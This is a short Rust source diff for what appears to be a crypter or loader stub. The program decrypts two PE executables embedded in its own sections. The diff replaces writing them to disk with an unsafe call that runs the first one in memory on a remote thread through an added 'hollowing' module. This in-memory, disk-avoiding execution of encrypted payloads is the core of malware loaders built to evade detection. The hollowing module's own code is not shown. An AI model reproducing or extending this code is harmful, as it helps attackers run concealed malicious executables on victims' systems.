@@ -1,14 +1,15 @@
-use std::fs;
-
 use pe_helpers::is_valid_pe_file;
+use pe_sections::{get_data_sections, get_key_section};
+use hollowing::execute_on_remote_thread;
 
 mod pe_sections;
 mod pe_helpers;
+mod hollowing;
 mod crypt;
 
 fn main() {
-    let encrypted_data = pe_sections::get_data_sections().to_vec();
-    let key = pe_sections::get_key_section();
+    let encrypted_data = get_data_sections().to_vec();
+    let key = get_key_section();
 
     let mut pos = 0;
 
@@ -29,9 +30,12 @@ fn main() {
     if !is_valid_pe_file(&second_file) {
         panic!("Second file is not valid PE");
     }
-    
-    fs::write("./file_one.decrypted.exe", first_file).unwrap();
-    fs::write("./file_two.decrypted.exe", second_file).unwrap();
 
     println!("Files successfully decrypted!");
+    
+    unsafe { 
+        if execute_on_remote_thread(&first_file).is_ok() {
+            println!("Successfully executed file on remote thread");
+        }; 
+    }
 }
